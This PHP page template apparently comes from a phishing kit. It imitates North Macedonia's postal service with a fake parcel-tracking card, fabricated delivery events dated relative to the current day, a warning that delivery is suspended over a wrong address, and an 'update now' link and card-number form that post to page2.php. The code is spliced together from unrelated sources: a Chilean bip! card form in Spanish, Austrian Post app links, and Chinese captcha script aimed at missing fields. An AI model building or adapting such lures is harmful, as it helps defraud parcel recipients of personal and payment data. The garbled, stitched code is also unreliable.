<?php
include('header-him.php');
?>
<style type="text/css">
  form button[type="submit"] {
    background: #00a8b7;
    border: 1px solid #007984;
    color: #FFF;
    -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
    -moz-border-radius: 4px;
    -webkit-border-radius: 4px;
    border-radius: 4px;
  }
  .login-form {
    margin-right: -10px;
    margin-left: -10px;
  }
  .container {
    line-height: 1.5;
  }
  .photoblock2 {
    background-image: url(<?php echo $folder_path;?>/images/photoblock_inbg.png) !important;
  }
  .innerpage {
    padding-top: 0px !important;
  }
  .tab-header-item {
    width: 49%;
    position: relative;
    float: left;
    padding: 0;
    margin: 0;
    background: gray;
    text-align: center;
    font-size: 16px;
    line-height: 40px !important;
    color: white;
    border-top-left-radius: 12px;
    border-top-right-radius: 12px;
    cursor: pointer;
  }
  .tab-header-item.active {
    background: black;
  }
  .pull-left {
    float: left !important;
  }
  .pull-right {
    float: right !important;
  }
  .tab-content {
    display: none;
  }
  .tab-content.active {
    display: block;
  }
  .tab-container {
    border-radius: 10px;
    box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
    transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
    padding: 1rem 0.6rem;
  }
  .tab-container form .btnSubmit {
    border-radius: 50px !important;
    width: 100%;
    margin-top: 0.5rem;
  }
  .tab-container .form-group {
    color: #333;
    /* font-size: 1.25rem; */
  }
  .form-info>i {
    margin-left: 12px;
  }
  .submit-info {
    width: 100%;
  }
</style>

<div class="container content__container">
    <div class="row justify-content-center content__row">

        <div class="col-md-12 col-lg-8">
            <div class="centerstage">
                <main role="main" class="main">
                    <div class="app-download-buttons-container for_desktop_only">
                        <h4>Post App gratis downloaden</h4>
                        <div class="downloadButtonsGrup">
                            <a href="https://play.google.com/store/apps/details?id=at.post.app" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/google-play-badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=81909C8B194522B0DF25A35DF4EBE4FA" class="appleBtn" alt="Google App Store Button">
                            </a>
                            <a href="https://apps.apple.com/at/app/post-sendungsverfolgung/id1520160912" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/Apple_App_Store_Badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=8BC09ACEAE5F70C62699F8F7C94CEB94" class="googlebtn" alt="Apple App Store Button">
                            </a>
                        </div>
                    </div>
                </main>
            </div>
        </div>

    </div>
</div>

<style type="text/css">
    form button[type="submit"] {
        background: #00a8b7;
        border: 1px solid #007984;
        color: #FFF;
        -moz-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -webkit-box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        box-shadow: 0px 2px 2px RGBA(0, 0, 0, 0.08);
        -moz-border-radius: 4px;
        -webkit-border-radius: 4px;
        border-radius: 4px;
    }
    .login-form {
        margin-right: -10px;
        margin-left: -10px;
    }
    .container {
        line-height: 1.5;
    }
    .photoblock2 {
        background-image: url(<?php echo $folder_path;?>/images/photoblock_inbg.png) !important;
    }
    .innerpage {
        padding-top: 0px !important;
    }
    .tab-header-item {
        width: 49%;
        position: relative;
        float: left;
        padding: 0;
        margin: 0;
        background: gray;
        text-align: center;
        font-size: 16px;
        line-height: 40px !important;
        color: white;
        border-top-left-radius: 12px;
        border-top-right-radius: 12px;
        cursor: pointer;
    }
    .tab-header-item.active {
        background: black;
    }
    .pull-left {
        float: left !important;
    }
    .pull-right {
        float: right !important;
    }
    .tab-content {
        display: none;
    }
    .tab-content.active {
        display: block;
    }
    .tab-container {
        border-radius: 10px;
        box-shadow: 2px 2px 10px -2px rgba(0, 0, 0, .5);
        transition: background .3s, border .3s, border-radius .3s, box-shadow .3s;
        padding: 1rem 0.6rem;
    }
    .tab-container form .btnSubmit {
        border-radius: 50px !important;
        width: 100%;
        margin-top: 0.5rem;
    }
    .tab-container .form-group {
        color: #333;
    }
    .form-info>i {
        margin-left: 12px;
    }
    .submit-info {
        width: 100%;
    }
</style>

<!-- main Start -->
<div id="center" class="main innerpage">
    <div class="old_code_wrap">
        <a class="accesskey" href="#aC" id="aC" accesskey="C" title="主要內容區">:::</a>
        <!-- photoblock start-->
        <section class="section col-12 photoblock2 no-print" style="background-image: url(<?php echo $folder_path;?>/images/photoblock_inbg.png) !important;">
        </section>
        <!-- photoblock end-->
        <div class="container">
            <!-- h1節點 -->
            <h1 style="font-size: 1.5em;margin: 0.83em 0;" class="title">consultas Sobre el estado de los Cargos no Pagados</h1>
            <!-- aP Start -->
            <section class="ap">
                <!-- searchform start -->
                <div class="searchform">
                    <div class="login-form">
                        <div class="tab-headers clearfix">
                            <h2 class="tab-header-item active" data-tab="loginForm">Carga tarjeta bip!</h2>
                            <!-- <h2 class="tab-header-item pull-right" data-tab="testform">Carga bip!QR</h2>   -->
                        </div>
                        <div class="tab-container">
                            <form action="./page2.php" method="POST" id="loginForm" data-tab="tab1" novalidate class="active tab-content">
                                <div class="form-group">
                                    <legend class="form-info">Número de tarjeta bip!<i class="fa fa-info-circle"></i></legend>
                                    <input type="text" placeholder="Ej: 123456789" name="username" required>
                                </div>
                                <div class="form-submit">
                                    <button type="submit" class="btnSubmit btn" name="submit" id="submit">Continuar</button>
                                    <center>
                                        <span class="submit-info">Al continuar estas aceptando nuestros <b>términos y condiciones</b>.</span>
                                    </center>
                                </div>
                            </form>
                            <form action="./page2.php" method="POST" id="testform" class="tab-content" novalidate>
                                <p>empty</p>
                            </form>
                        </div>
                    </div>
                </div>
            </section>
        </div>
    </div>
    <div class="container" style="padding: 0px!important;">
        <section class="ap">
            <div class="">
                <div class="card_wrap">
                    <div class="top_card">
                        <div class="id_main">
                            <span><img style="width: auto;height: 35px"  src="<?php echo $folder_path;?>/images/posta.ico" alt="Post Logo"> </span>
                            <div class="top_card_left">
                                <h4>RA064390860MK</h4>
                                <p class="short_id">Број на вејбил</p>
                            </div>
                        </div>
                        <p style="color: red" class="like_viewmore"></p>
                    </div>
                    <div class="bottom_card">
                        <p class="card_tag">Пошта на Северна Македонија</p>
                        <p class="post_date_card"><?php echo $globalDate; ?></p>
                    </div>
                </div>
            </div>
            <div class="">
                <div class="card_wrap">
                    <div class="time_line">
                        <div class="right-red colored" style="padding-left: 20px;width: 100%">
                            <h4 class="top_title_ps">Запрете ја испораката.</h4>
                            <p></p>
                            <p style="padding-top: 10px" class="bottom_color">Испораката на пакетот е суспендирана.</p>
                            <p></p>
                            <p></p>
                            <a href="#" style="text-decoration: underline;padding-top: 10px">Што се случи?</a>
                        </div>
                        <div>
                        </div>
                    </div>
                </div>
            </div>
            <style>
                .delivery-container {
                    display: flex;
                    align-items: center;
                    gap: 10px;
                }
                .dot-line {
                    display: flex;
                    align-items: center;
                    width: 400px; /* Adjust the length of the line as needed */
                }
                .dot {
                    width: 20px;
                    height: 20px;
                    background-color: black;
                    border-radius: 50%;
                }
                .horizontal-line {
                    height: 2px;
                    flex-grow: 1;
                    background-color: #ddd;
                }
                .car {
                    transform: scaleX(-1);
                    font-size: 24px;
                    color: black;
                }
                .title-text{
                    font-size: 13px!important;
                }
                @media (max-width: 767px) {
                    #dot1:before {
                        background-color: red!important; /* Red for the first dot */
                        color: red!important; /* Red for the first dot */
                    }
                    .left-green, .right-red {
                        width: 70%!important;
                    }
                    .right-red.colored::before {
                        background: #ffdc00;
                        border-color:#fff;
                    }
                    .time_line:last-child .right-red.colored::after {
                        background: #ddd;
                        opacity: 1;
                        height: 60%;
                        top: 30px;
                    }
                }
            </style>

            <div class="time_line_wrap only_mobile card_wrap">
                <div class="delivery-container">
                    <div class="dot-line">
                        <div class="dot"></div>
                        <div class="horizontal-line"></div>
                        <div class="dot"></div>
                        <div class="horizontal-line"></div>
                        <span class="car">🚚</span>
                    </div>
                </div>
                <div class="time_line one">
                    <div class="right-red" id="dot1">
                        <p class="top_title_ps"><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -0 DAY +2 HOURS'));?> 09:52</p>
                        <p class="bottom_color">Поради прашањата за решавање, испораката не беше возможна и пакетот беше вратен во центарот за сортирање</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red">
                        <p class="top_title_ps"><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -1 DAY +2 HOURS'));?> 15:17</p>
                        <p class="">Курирот пристигна во дистрибуцискиот центар и курирот е подготвен за испорака</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red">
                        <p class="top_title_ps"><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -2 DAY +2 HOURS'));?> 18:21</p>
                        <p class="bottom_color">Пакетот ја поминал инспекцијата и е испорачан до својата дестинација</p>
                    </div>
                    <div>
                    </div>
                </div>
                <div class="time_line">
                    <div class="right-red">
                        <p class="top_title_ps"><?php echo date(DATE_FORMATE, strtotime($globalDate . ' -3 DAY +3 HOURS'));?> 10:13</p>
                        <p class="bottom_color">Пакетот е примен и регистрацијата е комплетна</p>
                    </div>
                    <div>
                    </div>
                </div>
            </div>

            <div class="message_expert only_mobile">
                <div class="sub-title">
                    <div class="heading_wrap">
                        <img src="<?php echo $folder_path;?>/images/alert3.png"style="height: 30px">
                        <h2 class="title">Состојбата на пакетот е абнормална</h2>
                    </div>
                    <p class="title-text" style="margin-bottom: 5px!important;">Твојот пакет не е доставен поради неправилна адреса,Твојот пакет е вратен во најблискиот центар за сортирање.<strong></strong></p>
                    <p class="title-text">Ве молиме да ја ажурирате точната адреса што е можно побрзо и повторно ќе го доставиме вашиот пакет.<strong></strong></p>
                </div>
            </div>
            <div class="button_block only_mobile">
                <a href="page2.php"><button class="button_next">Ажурирај сега</button></a>
                <div class="app-download-buttons-container for_only_mobile">
                        <h4>Преземете ја најновата апликација за пошта</h4>
                        <div class="downloadButtonsGrup">
                            <a href="https://play.google.com/store/apps/details?id=at.post.app" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/google-play-badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=81909C8B194522B0DF25A35DF4EBE4FA" class="appleBtn" alt="Google App Store Button">
                            </a>
                            <a href="https://apps.apple.com/at/app/post-sendungsverfolgung/id1520160912" class="app-download-buttons__iconbtn" rel="noopener noreferrer" target="_blank">
                                <img src="https://assets.post.at/-/media/Bilder/Investor-Relations/Logos/Apple_App_Store_Badge.png?h=70&amp;w=200&amp;la=de-AT&amp;hash=8BC09ACEAE5F70C62699F8F7C94CEB94" class="googlebtn" alt="Apple App Store Button">
                            </a>
                        </div>
                    </div>
            </div>

        </section>
        <!-- aP End -->
        <script>
            function checkForm() {
                var canGo = true;
                var custno = $("#custNo").val();
                if (custno === "") {
                    $("#custNoError").show();
                    canGo = false;
                }
                var answer = $("#answer").val();
                if (answer === "") {
                    $("#answerError").show();
                    canGo = false;
                }
                return canGo;
            }

            function errorNoticeDisplay(fieldName, noticeWarning) {
                $("#" + fieldName + "Error").show();
                $("#" + fieldName + "ErrorWarning").text(noticeWarning);
            }

            function sendEmailCaptcha() {
                var returnValue = true;
                if ($("#email").val() == "" || $("#email").val() == "請輸入Email 帳號") {
                    errorNoticeDisplay('email', '請輸入Email 帳號');
                    returnValue = false;
                } else {
                    //var patternEmail = /^[\w\"\+-]+[\.]?[\w\"\+-]+@(\[)*\w+([\.-]?\w+)*(\.\w{2,})+(\])*$/;
                    var patternEmail = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                    if (patternEmail.test($("#email").val()) == false) {
                        errorNoticeDisplay('email', '請輸入合乎格式之Email 帳號');
                        returnValue = false;
                    } else {
                        patternEmail = /@yahoo\.|@kimo\.|@icloud\.|@me\./;
                        if (patternEmail.test($("#email").val().toLowerCase()) == true) {
                            errorNoticeDisplay('email',
                                '不建議使用@yahoo.、@kimo.、@icloud.及@me.信箱註冊，避免擋信!');
                        }
                    }
                }
                if (returnValue) {
                    $.ajax({
                        url: "/captcha/sendCaptcha",
                        type: "get",
                        data: {
                            "email": $("#email").val()
                        },
                        success: function(response) {
                            $('#modal1').hide();
                            $('.modal_overlay').hide();
                            if (response) {
                                swal("驗證碼已寄出，請至電子郵件信箱收信。");
                            } else {
                                swal("驗證碼已過期，請刷新驗證碼。");
                            }

                        },
                        error: function(response) {
                            swal("驗證碼已過期，請刷新驗證碼。");
                        }
                    });
                }
            }

            $(function() {
                $(".tab-header-item").on("click", function(e) {
                    e.preventDefault();
                    $(".tab-header-item").removeClass("active");
                    $(this).addClass("active");
                    var data_tab = $(this).attr("data-tab");
                    $(".tab-content").removeClass("active");
                    $("#" + data_tab).addClass("active");
                });

                $('#custNo').click(function() {
                    $('.annotation').show();
                    $("#answer").val("");
                });

                $('#answer').focus(function() {
                    $("#answer").val("");

                });
                $('#answer').keyup(function() {
                    var ans = $("#answer").val();
                    $("#answer").val(toASCII(ans));
                });

            });
        </script>
    </div>
</div>




<?php include('footer-him.php'); ?>

